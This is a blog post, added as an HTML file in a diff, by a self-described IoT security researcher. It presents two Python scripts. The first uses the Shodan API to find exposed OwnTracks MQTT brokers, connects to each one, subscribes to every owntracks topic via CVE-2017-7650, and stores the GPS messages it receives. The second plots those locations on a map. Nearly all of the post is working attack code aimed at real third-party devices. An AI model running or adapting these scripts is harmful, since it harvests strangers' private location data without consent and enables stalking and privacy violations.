@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Mqtt pwn :: Chirag Jariwala — Cyber security analyst and IoT security researcher</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Previously I was working on university minor project (IPS system for IoT devices). So, I have picked up CVE-2017-7650 to define snort rule for it. I was thinking how someone can leverage this silly vulnerability and I asked my self in current IoT space what kind of data can compromise user&amp;rsquo;s privacy. Yes, it is GPS data. I am big fan of Python programming and wanted to use it&amp;rsquo;s power, so I wrote to small python scripts which gathers list of IP addresses from Shodan API, tries to connect on those IPs as MQTT client."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/mqtt-pwn/" />
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/red.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Mqtt pwn :: Chirag Jariwala — Cyber security analyst and IoT security researcher" />
+<meta name="twitter:description" content="Previously I was working on university minor project (IPS system for IoT devices). So, I have picked up CVE-2017-7650 to define snort rule for it. I was thinking how someone can leverage this silly vulnerability and I asked my self in current IoT space what kind of data can compromise user&amp;rsquo;s privacy. Yes, it is GPS data. I am big fan of Python programming and wanted to use it&amp;rsquo;s power, so I wrote to small python scripts which gathers list of IP addresses from Shodan API, tries to connect on those IPs as MQTT client." />
+<meta name="twitter:site" content="/" />
+<meta name="twitter:creator" content="CJHackerz" />
+<meta name="twitter:image" content="">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Mqtt pwn :: Chirag Jariwala — Cyber security analyst and IoT security researcher">
+<meta property="og:description" content="Previously I was working on university minor project (IPS system for IoT devices). So, I have picked up CVE-2017-7650 to define snort rule for it. I was thinking how someone can leverage this silly vulnerability and I asked my self in current IoT space what kind of data can compromise user&amp;rsquo;s privacy. Yes, it is GPS data. I am big fan of Python programming and wanted to use it&amp;rsquo;s power, so I wrote to small python scripts which gathers list of IP addresses from Shodan API, tries to connect on those IPs as MQTT client." />
+<meta property="og:url" content="/posts/mqtt-pwn/" />
+<meta property="og:site_name" content="Mqtt pwn" />
+<meta property="og:image" content="">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2018-05-06 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    CJHackerz.Net
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/contact">Contact</a></li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/mqtt-pwn/">Mqtt pwn</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2018-05-06
+    </span>
+    
+    
+    <span class="post-author">::
+      CJHackerz
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/iot/">IoT</a>&nbsp;
+    
+    #<a href="/tags/cybersecurity/">Cybersecurity</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content">
+    
+
+<p>Previously I was working on university minor project (IPS system for IoT devices). So, I have picked up CVE-2017-7650 to define snort rule for it. I was thinking how someone can leverage this silly vulnerability and I asked my self in current IoT space what kind of data can compromise user&rsquo;s privacy. Yes, it is GPS data. I am big fan of Python programming and wanted to use it&rsquo;s power, so I wrote to small python scripts which gathers list of IP addresses from Shodan API, tries to connect on those IPs as MQTT client. If connection is established successfully(this happens because no ACL is present on those IPs), script will try to subscribe all owntracks topics with help of CVE-2017-7650 and stores GPS data in .json file later utilised by second script which tries to map out those GPS points.</p>
+
+<h3 id="mqtt-owntracks-pwn-py">mqtt-owntracks-pwn.py</h3>
+
+<pre><code class="language-python">import paho.mqtt.client as mqtt
+import shodan
+import time
+import os, sys, socket
+
+#Some house cleaning
+if sys.platform != &quot;win32&quot;:
+    os.system('clear')
+else:
+    os.system('cls')
+
+#Shodan API config
+SHODAN_API_KEY = &quot;&quot; #Sign up for new account at https://www.shodan.io and Put your shodan API key here(if you are university student please register with your university mail id to get fully featured account for free)
+shodan_api = shodan.Shodan(SHODAN_API_KEY)
+results = shodan_api.search(&quot;owntracks port:1883&quot;)
+
+
+def on_connect(client, userdata, flags, rc):
+    print(&quot;[+] Connection successful&quot;)
+    client.subscribe('owntracks/#', qos = 1)        # Subscribe to all topics
+
+def on_message(client, userdata, msg):
+    if msg.payload != &quot;&quot;:
+        print ('[+] Topic: %s \n[+] Message: %s \n' % (msg.topic, msg.payload))
+        f = open('CVE-2017-7650_owntracks_geodata.json', 'a+')
+        f.write(&quot;%s\n&quot; % (msg.payload))
+        f.close()
+    else:
+        print('Device is not vulnerable')
+
+client = mqtt.Client(client_id = &quot;MqttClient&quot;)
+client.on_connect = on_connect
+client.on_message = on_message
+
+for result in results['matches']:
+    ip_addr = result['ip_str']
+    f = open('CVE-2017-7650_owntracks_geodata.json', 'a')
+    print('[+] Data recieved from: ' + ip_addr + '\n\n\n')
+    f.close()
+    try:
+        client.connect(ip_addr, 1883, 60)
+    except socket.error, e:
+        print('[+] Error could not connect to ' + ip_addr)
+        continue
+    client.loop_start()
+    time.sleep(6)
+    client.loop_stop()
+    client.disconnect()
+
+    # Author: CJHackerz
+</code></pre>
+
+<h3 id="gps-location-mapper-py">gps-location-mapper.py</h3>
+
+<pre><code class="language-python">import folium
+import json
+from time import sleep
+
+
+geo_map = folium.Map(location=[0, 0],
+    zoom_start=3
+)
+
+with open('CVE-2017-7650_owntracks_geodata.json', 'r') as json_file:
+    
+    #Iterating through json objects in each new line
+    for data in json_file:
+        geo_data = json.loads(data)
+        
+        #To avoid encrypted data and json objects which does not have lat and lon attributes
+        try:
+            folium.Marker([geo_data['lat'], geo_data['lon']]).add_to(geo_map)
+        except KeyError:
+            continue
+
+geo_map.save('pwned_privacy_map.html')
+</code></pre>
+
+<h3 id="end-result">End result</h3>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="//player.vimeo.com/video/268267646" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>
+ </div>
+
+
+  </div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2019 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
